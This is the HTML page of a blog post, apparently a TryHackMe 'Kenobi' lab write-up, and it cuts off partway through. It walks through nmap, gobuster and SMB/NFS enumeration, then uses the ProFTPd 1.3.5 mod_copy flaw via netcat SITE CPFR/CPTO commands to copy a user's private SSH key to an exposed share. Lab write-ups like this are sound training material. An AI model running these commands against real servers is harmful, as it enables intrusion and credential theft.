<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Kenobi Writeup TryHackMe" /><meta name="author" content="v3r4x" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://0xv3r4x.github.io/posts/kenobi-writeup-tryhackme/" /><meta property="og:url" content="https://0xv3r4x.github.io/posts/kenobi-writeup-tryhackme/" /><meta property="og:site_name" content="v3r4x" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-29T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kenobi Writeup TryHackMe" /><meta name="twitter:site" content="@0xv3r4x" /><meta name="twitter:creator" content="@v3r4x" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"v3r4x"},"dateModified":"2022-06-29T00:00:00+01:00","datePublished":"2022-06-29T00:00:00+01:00","description":"Overview","headline":"Kenobi Writeup TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xv3r4x.github.io/posts/kenobi-writeup-tryhackme/"},"url":"https://0xv3r4x.github.io/posts/kenobi-writeup-tryhackme/"}</script><title>Kenobi Writeup | TryHackMe | v3r4x</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="v3r4x"><meta name="application-name" content="v3r4x"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/avatar-small.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">v3r4x</a></div><div class="site-subtitle font-italic">semper vigilat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0xV3R4X" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xv3r4x" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Kenobi Writeup | TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Kenobi Writeup | TryHackMe</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1656457200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 29, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> v3r4x </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3133 words"> <em>17 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that the Kenobi series on Disney Plus is over, I thought it would be fitting to tackle the <a href="https://tryhackme.com/room/kenobi">Kenobi room</a> on TryHackMe. In order to complete this room, we must enumerate the target machine for SMB (Server Message Block) shares, exploit a vulnerable version of ProFtpd to gain initial access to the machine, and escalate our privileges via path variable manipulation to get our flags.</p><p>I hope you enjoy!</p><h2 id="task-1---deploy-the-vulnerable-machine"><span class="mr-2">Task 1 - Deploy the Vulnerable Machine</span><a href="#task-1---deploy-the-vulnerable-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Once connection is established to the VM, we start with an initial nmap scan:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 10.10.207.7                    
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 23:30 BST
Nmap scan report for 10.10.207.7
Host is up (0.053s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
</span><span class="gp">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
</span><span class="gp">111/tcp   open  rpcbind     2-4 (RPC #</span>100000<span class="o">)</span>
<span class="go">| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38433/tcp   mountd
|   100005  1,2,3      52477/udp6  mountd
|   100005  1,2,3      53630/udp   mountd
|   100005  1,2,3      56743/tcp6  mountd
|   100021  1,3,4      37064/udp   nlockmgr
|   100021  1,3,4      40419/tcp6  nlockmgr
|   100021  1,3,4      44130/udp6  nlockmgr
|   100021  1,3,4      44465/tcp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
</span><span class="gp">2049/tcp  open  nfs_acl     2-3 (RPC #</span>100227<span class="o">)</span>
<span class="gp">38433/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">44465/tcp open  nlockmgr    1-4 (RPC #</span>100021<span class="o">)</span>
<span class="gp">48513/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">56651/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">Service Info: Host: KENOBI;</span><span class="w"> </span>OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
<span class="go">
Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-06-28T17:31:12-05:00
| smb2-time: 
|   date: 2022-06-28T22:31:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
</span><span class="gp">|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;</span>, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
<span class="go">|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.07 seconds
</span></pre></table></code></div></div><p>Here is a quick overview of the above scan:</p><ul><li><code class="language-plaintext highlighter-rouge">-sC</code>: Will perform a script scan using a set of default scripts.<li><code class="language-plaintext highlighter-rouge">-sV</code>: Will probe open ports to determine service and version information.<li><code class="language-plaintext highlighter-rouge">-T4</code>: Sets the timing for the scan (higher is faster).<li><code class="language-plaintext highlighter-rouge">-p-</code>: Specifies all ports will be scanned (1-65535).</ul><p>As shown from the scan, on the target machine there are 11 “open” ports. However, given some are RPC, we only need to consider ports 21, 22, 80, 111, 139, 445, and 2049. As such, we can say there are <strong>7 ports</strong> open on the target machine.</p><h2 id="task-2---enumerating-samba-for-shares"><span class="mr-2">Task 2 - Enumerating Samba for Shares</span><a href="#task-2---enumerating-samba-for-shares" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we have completed our initial reconnaissance, we can begin service enumeration. Firstly, let’s take a look at the web server running on <strong>port 80</strong>:</p><p><img data-src="/assets/posts/20220629/web_server.png" alt="" data-proofer-ignore></p><p>We can also run gobuster to check for hidden directories:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.207.7 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt
<span class="go">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.207.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/29 00:12:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 200]
/robots.txt           (Status: 200) [Size: 36] 
/server-status        (Status: 403) [Size: 276]
                                               
===============================================================
2022/06/29 00:12:29 Finished
===============================================================
</span></pre></table></code></div></div><p>Here is a quick overview of the above scan:</p><ul><li><code class="language-plaintext highlighter-rouge">dir</code>: Will perform a directory scan against a specified target.<li><code class="language-plaintext highlighter-rouge">-u</code>: The URL of the target.<li><code class="language-plaintext highlighter-rouge">-w</code>: Specifies the wordlist to use - <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> in this case.</ul><p>The output of the scan reveals there are <strong>5 files</strong> and <strong>1 directory</strong> on the target web server, four of which we are unauthorised to access (403 status code). However, we are able to access <code class="language-plaintext highlighter-rouge">robots.txt</code> which reveals:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>User-agent: *
Disallow: /admin.html
</pre></table></code></div></div><p>Navigating to <code class="language-plaintext highlighter-rouge">admin.html</code> reveals a nice easter egg to tell us we’ve gone down a rabbit hole:</p><p><img data-src="/assets/posts/20220629/trap.png" alt="" data-proofer-ignore></p><p>We can also enumerate the SMB shares that have been identified. We can do this using nmap:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 445 <span class="nt">--script</span><span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.207.7
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 00:08 BST
Nmap scan report for 10.10.207.7
Host is up (0.029s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
</span><span class="gp">|   \\10.10.207.7\IPC$</span>: 
<span class="go">|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.207.7\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
</span><span class="gp">|   \\10.10.207.7\print$</span>: 
<span class="go">|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\var\lib\samba\printers
</span><span class="gp">|     Anonymous access: &lt;none&gt;</span><span class="w">
</span><span class="gp">|_    Current user access: &lt;none&gt;</span><span class="w">
</span><span class="go">
Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds
</span></pre></table></code></div></div><p>Note that there are other tools which can be utilised, such as <a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a> that can achieve similar results. In this case, we select the two SMB scripts which are executed against the target on port 445. As shown, there are <strong>3 shares</strong> on the target machine, namely <em>guest</em>, <em>anonymous</em>, and <em>print$</em>.</p><p>We can access the <em>anonymous</em> share using <strong>smbclient</strong>, as follows:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>smbclient //10.10.207.7/anonymous
</pre></table></code></div></div><p>As this is an anonymous share, there are no credentials required for access:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>smbclient //10.10.207.7/anonymous                                       
<span class="go">Password for [WORKGROUP\v3r4x]:
Try "help" to get a list of possible commands.
</span><span class="gp">smb: \&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Once we have established access, we can see if there are any files on the share using the <code class="language-plaintext highlighter-rouge">ls</code> command:</p><p><img data-src="/assets/posts/20220629/log_txt.png" alt="" data-proofer-ignore></p><p>Looks like there is a <strong>log.txt</strong> file stored on the share. We can download this file by using the <code class="language-plaintext highlighter-rouge">get</code> command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>smb: \&gt; get log.txt
getting file \log.txt of size 12237 as log.txt (79.1 KiloBytes/sec) (average 79.1 KiloBytes/sec)
</pre></table></code></div></div><p>Note, you can also use <code class="language-plaintext highlighter-rouge">smbget</code> to recursively download the entire SMB share which is particularly useful if you have a share with lots of files:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">smbget -R smb://10.10.207.7/anonymous
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">log.txt</code> file contains a log of actions which took place on the target machine. It appears that the <code class="language-plaintext highlighter-rouge">kenobi</code> user created an SSH key and stored it in the <code class="language-plaintext highlighter-rouge">/home/kenobi/.ssh</code> directory.</p><p>Now that we have successfully enumerated the SMB share, we can move onto the FTP server. Looking back at our nmap scan, we see that FTP is running on <strong>port 21</strong>. We can also see that it is running ProFtpd (version 1.3.5). Unfortunately, we are unable to access this server at the moment.</p><p>Moving on, we can see that there is a RPCbind service running on port 111. Specifically, this is a server which converts RPC (Remote Procedure Call) program numbers into universal addresses. When this RPC service is initialised, it tells rpcbind the address at which it is listening and the RPC program number it is serving. You can find a list of RPC program numbers <a href="https://www.iana.org/assignments/rpc-program-numbers/rpc-program-numbers.xhtml">here</a> for future reference.</p><p>In this case, port 111 is used to access a Network File System (NFS) - RPC program number 100003. We can therefore use nmap to enumerate this:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 111 <span class="nt">--script</span><span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.207.7
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 00:32 BST
Nmap scan report for 10.10.207.7
Host is up (0.034s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836980.0  6876648.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
</span></pre></table></code></div></div><p>Similar to the scan we ran earlier against the SMB share, the above scan selects three nmap scripts which are executed against the target on port 111. From the output, we can see that we have a <strong><code class="language-plaintext highlighter-rouge">/var</code></strong> mount visible.</p><h2 id="task-3---gain-initial-access-with-proftpd"><span class="mr-2">Task 3 - Gain Initial Access with ProFtpd</span><a href="#task-3---gain-initial-access-with-proftpd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we have completed our enumeration, it is time to establish initial access with the target. In this case, we shall be exploiting the vulnerable ProFtpd server, but it is important to note that this room is a walkthrough. As such, often you will not know which service is vulnerable, so proper enumeration is vital.</p><p>ProFtpd is a free and open-source FTP server, compatible for both UNIX-based and Windows operating systems. From our initial nmap scan, we know that this service is running on port 21 with version <strong>1.3.5</strong>. We can confirm this by attempting to connect to it using netcat:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc 10.10.207.7 21
<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.7]
</span></pre></table></code></div></div><p>We can then utilise searchsploit, a command-line search tool for <a href="https://exploit-db.com">exploit-db</a>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>searchsploit proftpd 1.3.5
<span class="go">---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                               | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                           | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                         | linux/remote/36742.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</span></pre></table></code></div></div><p>As shown, there are <strong>4 exploits</strong> for version 1.3.5 of ProFtpd. The <code class="language-plaintext highlighter-rouge">mod_copy</code> modules implement two commands, namely <code class="language-plaintext highlighter-rouge">SITE CPFR</code> and <code class="language-plaintext highlighter-rouge">SITE CPTO</code>. These commands are used to copy files or directories from one place to another. In this instance, any unauthenticated user can copy files from any part of the filesystem to a specified destination.</p><p>From the log file (<code class="language-plaintext highlighter-rouge">log.txt</code>) found on the SMB share, we know that the FTP service is running as the <code class="language-plaintext highlighter-rouge">kenobi</code> user, and there exists a private SSH key in <code class="language-plaintext highlighter-rouge">/home/kenobi/.ssh/</code>. We can therefore copy the <code class="language-plaintext highlighter-rouge">id_rsa</code> SSH key from this directory to the NFS location (<code class="language-plaintext highlighter-rouge">/var</code>) on the target filesystem. To do this, we can use netcat:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc 10.10.207.7 21
<span class="go">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.7]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
</span></pre></table></code></div></div><p>We have no successfully moved the <code class="language-plaintext highlighter-rouge">id_rsa</code> key to the <code class="language-plaintext highlighter-rouge">/var/tmp</code> directory. To access this, we can create mount the NFS on our machine:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
